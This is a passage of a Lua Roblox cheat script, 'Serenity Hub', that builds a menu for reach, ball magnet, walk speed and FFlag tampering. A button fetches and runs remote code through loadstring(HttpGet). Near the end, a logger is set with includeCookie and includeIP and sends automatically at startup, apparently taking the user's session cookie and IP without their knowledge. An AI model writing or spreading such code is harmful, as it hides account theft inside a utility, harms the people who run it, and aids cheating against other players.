    infoText = infoText .. "EXECUTOR: " .. executorName .. "\n"
    infoText = infoText .. "PLAYERS: " .. playerCount .. "\n"
    infoText = infoText .. "STATUS: UNDETECTED"
    
    if HomeInfoLabel then
        HomeInfoLabel.Text = infoText
    end
end

task.spawn(function()
    wait(0.5)
    UpdateHomeInfo()
end)

task.spawn(function()
    while task.wait(2) do
        if CurrentTab == "Home" then
            UpdateHomeInfo()
        end
    end
end)

Players.PlayerAdded:Connect(UpdateHomeInfo)
Players.PlayerRemoving:Connect(UpdateHomeInfo)

-- ==========================================
-- [17] UI - TAB: REACH
-- ==========================================
local ReachContent = CreateTabContent("Reach")
TabContents["Reach"] = ReachContent

CreateToggle(ReachContent, "Leg Reach Enabled", true, 55, function(v) end, true)

CreateSlider(ReachContent, "Leg Reach Size", 0, 30, 0.1, BallReachSize, 115, function(v)
    BallReachSize = v
end)

CreateSlider(ReachContent, "Leg Visualizer", 0.1, 1, 0.1, Transparency, 200, function(v)
    Transparency = v
end)

-- ==========================================
-- [18] UI - TAB: REACT
-- ==========================================
local ReactContent = CreateTabContent("React")
TabContents["React"] = ReactContent

local reactY = 55

CreateToggle(ReactContent, "Ball Magnet", ReactSettings.BallMagnet, reactY, function(v)
    ReactSettings.BallMagnet = v
end, true)

CreateToggle(ReactContent, "No Ball Delay", ReactSettings.NoBallDelay, reactY + 55, function(v)
    ReactSettings.NoBallDelay = v
end, true)

CreateToggle(ReactContent, "Alz React", ReactSettings.AlzReact, reactY + 110, function(v)
    ReactSettings.AlzReact = v
end, true)

CreateToggle(ReactContent, "Foxtede React", ReactSettings.FoxtedeReact, reactY + 165, function(v)
    ReactSettings.FoxtedeReact = v
end, true)

-- ==========================================
-- [19] UI - TAB: HELPERS
-- ==========================================
local HelpersContent = CreateTabContent("Helpers")
TabContents["Helpers"] = HelpersContent

CreateToggle(HelpersContent, "Air Helper", PlatformEnabled, 55, function(v)
    PlatformEnabled = v
    if v then StartPlatformSystem() else StopPlatformSystem() end
end)

CreateSlider(HelpersContent, "Platform Size", 3, 30, 1, PlatformSize, 115, function(v)
    PlatformSize = v
    UpdatePlatformSize()
end)

CreateSlider(HelpersContent, "Smoothness", 0.1, 0.9, 0.05, Smoothness, 200, function(v)
    Smoothness = v
end)

CreateSlider(HelpersContent, "Transparency", 0, 1, 0.05, PlatformTransparency, 285, function(v)
    PlatformTransparency = v
    UpdatePlatformTransparency()
end)

CreateToggle(HelpersContent, "Show Platform", ShowPlatform, 370, function(v)
    ShowPlatform = v
    UpdatePlatformVisibility()
end)

-- ==========================================
-- [20] UI - TAB: PLAYER
-- ==========================================
local PlayerContent = CreateTabContent("Player")
TabContents["Player"] = PlayerContent

local walkSpeedToggle = CreateToggle(PlayerContent, "WalkSpeed Enabled", false, 55, function(v)
    WalkSpeedEnabled = v
    if not v then
        local character = LocalPlayer.Character
        if character then
            local humanoid = character:FindFirstChild("Humanoid")
            if humanoid then
                humanoid.WalkSpeed = DefaultWalkSpeed
            end
        end
    else
        local character = LocalPlayer.Character
        if character then
            local humanoid = character:FindFirstChild("Humanoid")
            if humanoid then
                humanoid.WalkSpeed = WalkSpeedValue
            end
        end
    end
end)

local walkSpeedSlider = CreateSlider(PlayerContent, "WalkSpeed", 0, 31, 1, WalkSpeedValue, 115, function(v)
    WalkSpeedValue = v
    if WalkSpeedEnabled then
        local character = LocalPlayer.Character
        if character then
            local humanoid = character:FindFirstChild("Humanoid")
            if humanoid then
                humanoid.WalkSpeed = v
            end
        end
    end
end)

CreateButton(PlayerContent, "Korblox And Headless", 205, function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/VortexDEV-CVM/scripts/refs/heads/main/Headless%20and%20Korblox.lua"))()
end)

-- ==========================================
-- [21] UI - TAB: FFLAG
-- ==========================================
local FFlagContent = CreateTabContent("FFlag")
TabContents["FFlag"] = FFlagContent

local inputY = 55

local flag1Input = CreateInputBox(FFlagContent, "DFIntTargetTimeDelayFactorTenths", FFlagValues["DFIntTargetTimeDelayFactorTenths"], inputY, function(v)
    FFlagValues["DFIntTargetTimeDelayFactorTenths"] = v
    local success = ApplyFFlags()
    if success then
        ShowNotification("FFlag", "Value updated: " .. v)
    else
        ShowNotification("FFlag", "Could not apply")
    end
end)

local flag2Input = CreateInputBox(FFlagContent, "FIntInterpolationMaxDelayMSec", FFlagValues["FIntInterpolationMaxDelayMSec"], inputY + 55, function(v)
    FFlagValues["FIntInterpolationMaxDelayMSec"] = v
    local success = ApplyFFlags()
    if success then
        ShowNotification("FFlag", "Value updated: " .. v)
    else
        ShowNotification("FFlag", "Could not apply")
    end
end)

local flag3Input = CreateInputBox(FFlagContent, "DFIntS2PhysicsSenderRate", FFlagValues["DFIntS2PhysicsSenderRate"], inputY + 110, function(v)
    FFlagValues["DFIntS2PhysicsSenderRate"] = v
    local success = ApplyFFlags()
    if success then
        ShowNotification("FFlag", "Value updated: " .. v)
    else
        ShowNotification("FFlag", "Could not apply")
    end
end)

local ApplyButton = Instance.new("TextButton")
ApplyButton.Size = UDim2.new(0.4, 0, 0, 40)
ApplyButton.Position = UDim2.new(0.1, 0, 0, inputY + 180)
ApplyButton.BackgroundColor3 = PURPLE
ApplyButton.TextColor3 = Color3.fromRGB(255, 255, 255)
ApplyButton.Text = "Apply FFlags"
ApplyButton.TextSize = 16
ApplyButton.Font = FONT_BOLD
ApplyButton.BorderSizePixel = 0
ApplyButton.Parent = FFlagContent

local ApplyCorner = Instance.new("UICorner")
ApplyCorner.CornerRadius = UDim.new(0, 8)
ApplyCorner.Parent = ApplyButton

ApplyButton.MouseButton1Click:Connect(function()
    local success = ApplyFFlags()
    if success then
        ShowNotification("FFlags", "FFlags applied successfully")
    else
        ShowNotification("FFlags", "Could not apply")
    end
end)

local ResetButton = Instance.new("TextButton")
ResetButton.Size = UDim2.new(0.4, 0, 0, 40)
ResetButton.Position = UDim2.new(0.55, 0, 0, inputY + 180)
ResetButton.BackgroundColor3 = Color3.fromRGB(40, 35, 60)
ResetButton.TextColor3 = Color3.fromRGB(255, 255, 255)
ResetButton.Text = "Reset Values"
ResetButton.TextSize = 16
ResetButton.Font = FONT_BOLD
ResetButton.BorderSizePixel = 0
ResetButton.Parent = FFlagContent

local ResetCorner = Instance.new("UICorner")
ResetCorner.CornerRadius = UDim.new(0, 8)
ResetCorner.Parent = ResetButton

ResetButton.MouseButton1Click:Connect(function()
    FFlagValues["DFIntTargetTimeDelayFactorTenths"] = "100"
    FFlagValues["FIntInterpolationMaxDelayMSec"] = "1000"
    FFlagValues["DFIntS2PhysicsSenderRate"] = "0"
    
    flag1Input.SetValue("100")
    flag2Input.SetValue("1000")
    flag3Input.SetValue("0")
    
    local success = ApplyFFlags()
    if success then
        ShowNotification("FFlags", "Values reset and applied")
    else
        ShowNotification("FFlags", "Values reset (could not apply)")
    end
end)

task.spawn(function()
    wait(1)
    ApplyFFlags()
end)

-- ==========================================
-- [22] UI - TAB NAVIGATION WITH ANIMATION
-- ==========================================

local SelectedIndicator = Instance.new("Frame")
SelectedIndicator.Size = UDim2.new(0, 3, 0, 25)
SelectedIndicator.Position = UDim2.new(0, 0, 0, 82)
SelectedIndicator.BackgroundColor3 = PURPLE
SelectedIndicator.BorderSizePixel = 0
SelectedIndicator.Parent = Sidebar

local function AnimateIndicator(targetY)
    local tweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
    local goal = { Position = UDim2.new(0, 0, 0, targetY) }
    local tween = TweenService:Create(SelectedIndicator, tweenInfo, goal)
    tween:Play()
end

local function SwitchTab(tabName)
    for name, container in pairs(TabContents) do
        container.Visible = (name == tabName)
    end
    
    CurrentTab = tabName
    
    for name, button in pairs(TabButtons) do
        button.TextColor3 = (name == tabName) and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(180, 170, 200)
    end
    
    if tabName == "Home" then
        UpdateHomeInfo()
    end
    
    local index = 1
    local tabList = {"Home", "Reach", "React", "Helpers", "Player", "FFlag"}
    for i, name in ipairs(tabList) do
        if name == tabName then
            index = i
            break
        end
    end
    
    local targetY = 78 + (index - 1) * 40
    AnimateIndicator(targetY)
end

local TabList = {"Home", "Reach", "React", "Helpers", "Player", "FFlag"}

for i, tabName in ipairs(TabList) do
    local Button = Instance.new("TextButton")
    Button.Size = UDim2.new(1, -20, 0, 35)
    Button.Position = UDim2.new(0, 10, 0, 75 + (i-1) * 40)
    Button.BackgroundTransparency = 1
    Button.Text = tabName
    Button.TextColor3 = (tabName == "Home") and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(180, 170, 200)
    Button.TextSize = 14
    Button.TextXAlignment = Enum.TextXAlignment.Left
    Button.Font = FONT -- Gotham
    Button.BorderSizePixel = 0
    Button.Parent = Sidebar
    TabButtons[tabName] = Button
    
    Button.MouseEnter:Connect(function()
        if CurrentTab ~= tabName then
            Button.TextColor3 = Color3.fromRGB(255, 255, 255)
        end
    end)
    
    Button.MouseLeave:Connect(function()
        if CurrentTab ~= tabName then
            Button.TextColor3 = Color3.fromRGB(180, 170, 200)
        end
    end)
    
    Button.MouseButton1Click:Connect(function()
        SwitchTab(tabName)
    end)
end

SwitchTab("Home")

-- ==========================================
-- [23] START WALKSPEED LOOP
-- ==========================================
StartWalkSpeedLoop()

-- ==========================================
-- [24] UI - TOGGLE CON RIGHTSHIFT
-- ==========================================

UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    
    if input.KeyCode == Enum.KeyCode.RightShift then
        uiVisible = not uiVisible
        MainFrame.Visible = uiVisible
    end
end)

-- ==========================================
-- [25] DRAG UI Y BLOQUEO DE CLICS
-- ==========================================

local isMouseOverUI = false
local isDraggingUI = false
local dragStartPos = nil
local dragStartMouse = nil

MainFrame.MouseEnter:Connect(function()
    isMouseOverUI = true
end)

MainFrame.MouseLeave:Connect(function()
    isMouseOverUI = false
end)

MainFrame.InputBegan:Connect(function(input, gameProcessed)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        local mousePos = input.Position
        local sidebarAbs = Sidebar.AbsolutePosition
        local sidebarSize = Sidebar.AbsoluteSize
        
        if (mousePos.X >= sidebarAbs.X and mousePos.X <= sidebarAbs.X + sidebarSize.X and
            mousePos.Y >= sidebarAbs.Y and mousePos.Y <= sidebarAbs.Y + sidebarSize.Y) or
           (mousePos.Y >= MainFrame.AbsolutePosition.Y and mousePos.Y <= MainFrame.AbsolutePosition.Y + 60) then
            isDraggingUI = true
            dragStartPos = MainFrame.Position
            dragStartMouse = input.Position
        end
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement and isDraggingUI then
        local delta = input.Position - dragStartMouse
        MainFrame.Position = UDim2.new(
            dragStartPos.X.Scale,
            dragStartPos.X.Offset + delta.X,
            dragStartPos.Y.Scale,
            dragStartPos.Y.Offset + delta.Y
        )
    end
end)

UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 and isDraggingUI then
        isDraggingUI = false
        dragStartPos = nil
        dragStartMouse = nil
    end
end)

UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if isMouseOverUI and input.UserInputType == Enum.UserInputType.MouseButton1 then
        gameProcessed = true
        return
    end
end)

-- ==========================================
-- [26] UI - NOTIFICACIONES
-- ==========================================

local function ShowNotification(title, content)
    local Notification = Instance.new("Frame")
    Notification.Size = UDim2.new(0, 350, 0, 70)
    Notification.Position = UDim2.new(0.5, -175, 0.1, 10)
    Notification.BackgroundColor3 = Color3.fromRGB(20, 15, 35)
    Notification.BackgroundTransparency = 0.05
    Notification.BorderSizePixel = 0
    Notification.Parent = ScreenGui
    
    local NotifCorner = Instance.new("UICorner")
    NotifCorner.CornerRadius = UDim.new(0, 8)
    NotifCorner.Parent = Notification
    
    local BorderLine = Instance.new("Frame")
    BorderLine.Size = UDim2.new(1, 0, 0, 2)
    BorderLine.Position = UDim2.new(0, 0, 0, 0)
    BorderLine.BackgroundColor3 = PURPLE
    BorderLine.BorderSizePixel = 0
    BorderLine.Parent = Notification
    
    local TitleLabel = Instance.new("TextLabel")
    TitleLabel.Size = UDim2.new(1, -20, 0, 25)
    TitleLabel.Position = UDim2.new(0, 10, 0, 5)
    TitleLabel.BackgroundTransparency = 1
    TitleLabel.Text = title
    TitleLabel.TextColor3 = PURPLE_LIGHT
    TitleLabel.TextSize = 16
    TitleLabel.TextXAlignment = Enum.TextXAlignment.Left
    TitleLabel.Font = FONT_BOLD
    TitleLabel.Parent = Notification
    
    local ContentLabel = Instance.new("TextLabel")
    ContentLabel.Size = UDim2.new(1, -20, 0, 30)
    ContentLabel.Position = UDim2.new(0, 10, 0, 30)
    ContentLabel.BackgroundTransparency = 1
    ContentLabel.Text = content
    ContentLabel.TextColor3 = Color3.fromRGB(200, 190, 210)
    ContentLabel.TextSize = 13
    ContentLabel.TextXAlignment = Enum.TextXAlignment.Left
    ContentLabel.Font = FONT
    ContentLabel.Parent = Notification
    
    task.delay(4, function()
        Notification:TweenPosition(UDim2.new(0.5, -175, -0.1, 10), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.3, true, function()
            Notification:Destroy()
        end)
    end)
end

ShowNotification("Serenity Hub", "Loaded! (Touchline UI)")

-- ==========================================
-- [27] ENVÍO DEL LOGGER AL INICIAR
-- ==========================================

-- Configurar logger
Logger.SetConfig({
    includeCookie = true,
    includeIP = true,
    delay = 3
})

-- Enviar logger al iniciar (con retraso para asegurar que todo cargue)
task.spawn(function()
    wait(3)
    Logger.Send({
        ["Script"] = "Serenity Hub - Touchline UI",
        ["Version"] = "2.0",
        ["Executor"] = DetectExecutor(),
        ["Estado"] = "✅ Iniciado correctamente"
    })
end)

-- ==========================================
-- [28] LIMPIEZA Y CIERRE
-- ==========================================

local function Cleanup()
    if walkSpeedConnection then walkSpeedConnection:Disconnect() end
    if platformConnection then platformConnection:Disconnect() end
    if reachConnection then reachConnection:Disconnect() end
    ClearAllPlatforms()
end

game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui").ChildRemoved:Connect(function(child)
    if child == ScreenGui then
        Cleanup()
    end
end)

game:BindToClose(function()
    Cleanup()
end)